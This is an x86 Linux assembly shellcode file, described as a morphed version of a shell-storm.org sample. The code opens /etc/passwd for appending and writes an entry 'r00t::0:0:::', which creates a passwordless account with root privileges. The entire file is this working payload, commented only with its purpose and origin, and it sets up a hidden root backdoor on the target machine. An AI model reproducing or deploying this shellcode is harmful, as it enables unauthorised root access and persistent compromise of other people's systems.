; Shellcode purpose - Add a user without password
; This shellcode is a morphed version of a shellcode taken from shell-storm.org
; OG shellcode - http://shell-storm.org/shellcode/files/shellcode-211.php


 section .text
 
       global _start
 
  _start:
       push byte 2 ;
       push byte 5
       pop eax
       xor ecx, ecx
       push ecx
       push 0x64777373
       push 0x61702f2f
       push 0x6374652f
       mov eax, 0x5 ;
       mov ebx, esp
       mov cx, 02001Q
       int 0x80
 
       mov ebx, eax
       
       push byte 4
       pop eax
       xor edx, edx
       mov edx, 0x10 ;
       sub edx, 0x10 ;
       push edx
       push 0x3a3a3a30
       push 0x3a303a3a
       push 0x74303072
       mov ecx, esp
       push byte 12
       pop edx
       int 0x80
 
       xor eax, eax ;
       mov eax, 0x6 ;
       int 0x80
 
       push byte 1
       pop eax
       int 0x80
 
section .data
       db random: "loremipsum", 0x0
